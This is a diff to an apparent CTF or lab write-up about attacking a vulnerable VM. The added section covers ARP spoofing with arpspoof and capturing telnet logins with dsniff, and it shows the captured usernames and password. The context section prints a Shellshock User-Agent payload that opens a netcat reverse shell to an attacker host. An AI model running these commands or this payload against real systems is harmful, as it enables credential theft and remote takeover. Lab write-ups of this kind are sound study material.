@@ -98,6 +98,60 @@ Server: lighttpd/1.4.26
 
 This leads to no change, however, increasing the colons in [::1] to more than 7 will cause Internal Server Error. This is documented [here](http://redmine.lighttpd.net/projects/lighttpd/repository/revisions/2959/diff/) on line 47 in requests.c
 
+#### ARP Spoof & TELNET hijack approach
+
+Using Wireshark I saw there was a TELNET connection going to an IP that did not exist on the network. I decided to ARPSPOOF and pretend I was this IP, and then listen for TELNET connection: And I got a connection!
+
+First, I stole the IPs with arp poisoning as such:
+
+
+```
+root@battlestation:~# arpspoof -i eth0 -t 192.168.248.129 192.168.248.1
+0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b
+0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b
+0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b
+
+```
+
+and
+
+```
+arpspoof -i eth0 -t 192.168.248.129 172.16.57.130
+0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
+0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
+0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
+```
+
+Then, I listened for TELNET connections, and got this:
+
+```
+root@battlestation:~# dsniff -t 23/tcp=telnet -n
+dsniff: listening on eth0
+-----------------
+10/28/14 03:31:48 tcp 172.16.57.129.27008 -> 172.16.57.130.23 (telnet)
+john
+meTarzanSuperUser
+sudo su +-
+meTarzanSuperUser
+AiAiAi....
+
+-----------------
+
+tarzan
+meTarzanSuperUser
+root
+admin
+meTarzanSuperUser
+
+-----------------
+10/28/14 03:36:49 tcp 172.16.57.129.27008 -> 172.16.57.130.23 (telnet)
+john
+meTarzanSuperUser
+sudo su +-
+meTarzanSuperUser
+AiAiAi....
+```
+
 
 #### Shellshock
 I believe these VMs were created before shellshock was discovered / patched, or it may have slipped the authors mind. I **think** I managed to get a remote code execution running using `wget` with the header ` User-Agent: () { :; }; /bin/bash -c "nc 192.168.248.132 6666 -e /bin/bash -i"` although this should not be possible, unless the default index page which we still do not know the name of is a `cgi-bin` script, and it might be. 
